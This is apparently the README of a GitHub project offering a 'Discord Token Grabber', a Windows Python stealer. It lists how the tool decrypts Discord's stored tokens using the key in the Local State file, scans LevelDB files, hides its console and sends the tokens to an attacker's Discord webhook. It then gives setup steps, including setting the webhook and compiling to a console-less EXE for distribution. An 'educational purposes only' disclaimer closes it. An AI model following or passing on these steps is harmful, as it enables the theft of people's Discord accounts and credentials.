<div align="center">
  <h1>🔥 Discord Token Grabber</h1>
  <p><strong>A clean & powerful Discord token stealer for educational purposes only</strong></p>

  <img src="https://img.shields.io/badge/Python-3.11+-blue?style=for-the-badge&logo=python" alt="Python">
  <img src="https://img.shields.io/badge/Windows-Only-0078D4?style=for-the-badge&logo=windows" alt="Windows">
  <img src="https://img.shields.io/badge/Status-Working-green?style=for-the-badge" alt="Status">

  <br><br>

  <!-- Fixed Banner -->
  <img src="https://avatars.githubusercontent.com/u/246539416?s=400&u=7db1395e75bc70cf7ecbd3a1a9aa84dbc76b85ac&v=4" 
       width="600" 
       alt="Banner" 
       style="border-radius: 15px; box-shadow: 0 8px 30px rgba(0,0,0,0.4);">
</div>

---

## ✨ Features

- Stealth mode (hides console window automatically)
- Advanced decryption using DPAPI + AES-GCM
- Scans Discord's LevelDB database (.log & .ldb files)
- Automatic duplicate removal
- Fast and lightweight
- Sends tokens instantly to Discord webhook

---

## 🛠️ How It Works

1. Extracts the master encryption key from `%APPDATA%\discord\Local State`
2. Scans the LevelDB folder for encrypted tokens
3. Decrypts tokens using AES-GCM
4. Validates and deduplicates them
5. Sends all valid tokens to your webhook

---

## 📥 Installation & Usage

```bash
git clone https://github.com/blaxkmiradev/Discord-Token-Grabber.git
cd Discord-Token-Grabber
Install Dependencies
Bashpip install pycryptodome pywin32 requests
Configure Webhook
Edit grabber.py and set your own Discord webhook:
PythonWEBHOOK_URL = "https://discord.com/api/webhooks/YOUR_WEBHOOK_ID/YOUR_WEBHOOK_TOKEN"
Compile to EXE (Recommended)
Bashpip install pyinstaller
pyinstaller --onefile --noconsole --hidden-import=win32crypt grabber.py

⚠️ Important Disclaimer
This project is for educational and cybersecurity research purposes only.
Unauthorized use to steal Discord accounts is illegal and violates Discord's Terms of Service.
I am not responsible for any misuse of this code.

📜 License
This project is licensed under the MIT License — feel free to use it for learning.


  Made with ❤️ for Cybersecurity Awareness

  Reverse Engineering • Python • Malware Analysis
